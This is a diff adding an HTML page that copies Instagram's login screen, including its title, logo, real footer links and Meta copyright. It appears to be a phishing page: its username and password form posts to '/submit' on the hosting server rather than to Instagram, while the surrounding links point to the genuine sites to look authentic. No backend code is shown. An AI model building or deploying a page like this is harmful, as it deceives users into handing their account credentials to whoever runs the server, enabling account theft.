@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+		
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width,initial_scale=1.0" />
+	<title>Log in Instagram</title>
+	<link rel="stylesheet" href="style.css" />
+	<link rel="stylesheet" href="media-queries.css" />
+	<link rel="icon" href="insta-icon.jpg" />
+</head>
+<body>
+	<main>
+		<div class="log-in-container">
+			<div class="log-in">
+				<img src="logo.png" class="logo"/>
+				<form action="/submit", method="post">
+					<div class="log-in-form" >
+						<input type="text" placeholder="Phone number,username or email" name="username" style="width: 250px;"/>
+						<div class="password-container">
+							<input type="password" id="password" placeholder="Password" name="password"	style="width: 250px;">
+							<b><span class="toggle-icon" onclick="togglePassword()">Show</span></b>
+						</div>
+						<button class="log-in-button" type="submit">Log In</button>
+					</div>
+				</form>
+				<span class="or-divider">OR</span>
+				<!--FACEBOOK OPTION-->
+				<div class="fb-login">
+					<a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATB74zovZyCei6YMlyl3wipXEAUiFx6UArZgJHqgLQ-PC1elQinmAKFh0gG9y4CrXAPjYArDLduNK8hDN0MvMQMvR8-roVKKDJs_nMcqlluWZdL2SUXdGSVeu1_VHcZTHIe6nUOJw7BxWiQxUPOxpX1x_IeozoxSeYEAve0uWMZIo6-MpbXbns_fDVGCc6K9ZBMuxsgyZPJd6sWHDp6i-FsP-yumbzRx7TjlcpcnHU3UcCVVBcp17FECMrrA2qn8qNpO">
+						<img src="facebook-icon.png">
+						<span>Log in with Facebook</span>
+					</a>
+				</div>
+				<a href="https://www.instagram.com/accounts/password/reset/?hl=en">Forgot password?</a>
+			</div>
+			<!--sign up-->
+			<div class="sign-up">
+				<span>Don't have an account
+					<a href="https://www.instagram.com/accounts/emailsignup/?hl=en">Sign up</a>
+				</span>
+			</div>
+			<!--download-->
+			<div class="get-the-app">
+				<span>Get the app</span>
+				<div class="app-images">
+					<a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="applestore.png" /></a>
+					<a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN&pli=1"><img src="googlestore.png" /></a>
+				</div>
+			</div>
+
+		</div>
+	</main>
+	<footer>
+		<ul class="footer-links">
+			<li><a href="https://about.meta.com/">Meta</a></li>
+			<li><a href="https://about.instagram.com/">About</a></li>
+			<li><a href="https://about.instagram.com/blog">Blog</a></li>
+			<li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
+			<li><a href="https://help.instagram.com/">Help</a></li>
+			<li><a href="https://developers.facebook.com/docs/instagram-platform">API</a></li>
+			<li><a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a></li>
+			<li><a href="https://help.instagram.com/581066165581870/">Terms</a></li>
+			<li><a href="https://www.instagram.com/explore/locations/?hl=en">Location</a></li>
+			<li><a href="https://www.instagram.com/web/lite/?hl=en">Instagram Lite</a></li>
+			<li><a href="https://www.threads.net/">Threads</a></li>
+			<li><a href="https://www.facebook.com/help/instagram/261704639352628?hl=en">Contact Uploading & Non-Users</a></li>
+			<li><a href="#">Meta Verified</a></li>
+		</ul>
+		<span class="copyright">© 2025 Instagram from Meta</span>
+	</footer>
+
+	<script>
+        function togglePassword() {
+            let passwordField = document.getElementById("password");
+            let icon = document.querySelector(".toggle-icon");
+            
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                icon.textContent = "Hide";
+            } else {
+                passwordField.type = "password";
+                icon.textContent = "Show";
+            }
+        }
+    </script>
+	</body>
+
+</html>
